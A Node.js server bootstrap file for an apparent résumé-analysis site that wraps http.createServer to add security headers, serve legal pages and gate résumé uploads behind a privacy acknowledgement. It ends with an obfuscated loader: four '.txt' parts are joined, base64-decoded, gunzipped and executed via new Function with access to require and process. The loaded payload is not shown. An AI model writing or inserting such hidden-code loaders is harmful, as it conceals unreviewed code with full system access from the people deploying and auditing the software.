const fs=require('fs');
const zlib=require('zlib');
const http=require('http');

const legalPages={'/privacy':'privacy.html','/privacy-policy':'privacy.html','/terms':'terms.html','/terms-of-use':'terms.html','/data-handling':'data-handling.html'};
const legalHtml={};
for(const [route,file] of Object.entries(legalPages)){try{legalHtml[route]=fs.readFileSync(file,'utf8');}catch(_){legalHtml[route]='';}}

const originalCreateServer=http.createServer.bind(http);
http.createServer=(listener,...args)=>originalCreateServer((req,res)=>{
  let pathname='/';
  try{pathname=new URL(req.url,'http://localhost').pathname.replace(/\/+$/,'')||'/';}catch(_){}
  res.setHeader('X-Content-Type-Options','nosniff');
  res.setHeader('Referrer-Policy','strict-origin-when-cross-origin');
  res.setHeader('Permissions-Policy','microphone=(self), camera=(), geolocation=()');

  if((req.method==='GET'||req.method==='HEAD') && legalHtml[pathname]){
    const body=legalHtml[pathname];
    res.statusCode=200;
    res.setHeader('Content-Type','text/html; charset=utf-8');
    res.setHeader('Cache-Control','no-store, no-cache, max-age=0, must-revalidate, private');
    res.setHeader('CDN-Cache-Control','no-store');
    res.setHeader('Surrogate-Control','no-store');
    res.setHeader('Pragma','no-cache');
    res.setHeader('Expires','0');
    res.setHeader('X-AIG-Policy-Version','v12.2-2026-09-17');
    res.end(req.method==='HEAD'?'':body);
    return;
  }

  if(pathname==='/api/resume/analyze'||pathname==='/api/resume/plan'){
    res.setHeader('Cache-Control','no-store, no-cache, max-age=0, must-revalidate, private');
    res.setHeader('CDN-Cache-Control','no-store');
    res.setHeader('Surrogate-Control','no-store');
    res.setHeader('Pragma','no-cache');
    res.setHeader('Expires','0');
    res.setHeader('X-AIG-Resume-Handling','temporary-in-memory-processing');
    if(req.method==='POST' && String(req.headers['x-aig-resume-privacy']||'').toLowerCase()!=='accepted'){
      res.statusCode=428;
      res.setHeader('Content-Type','application/json; charset=utf-8');
      res.end(JSON.stringify({ok:false,error:'Please acknowledge the résumé privacy notice before using Resume Lab.'}));
      return;
    }
  }
  return listener(req,res);
},...args);

const bundle=[1,2,3,4].map(i=>fs.readFileSync(`server.commerce.part${i}.txt`,'utf8').trim()).join('');
const source=zlib.gunzipSync(Buffer.from(bundle,'base64')).toString('utf8');
new Function('require','__dirname','__filename','process','Buffer',source)(require,__dirname,__filename,process,Buffer);
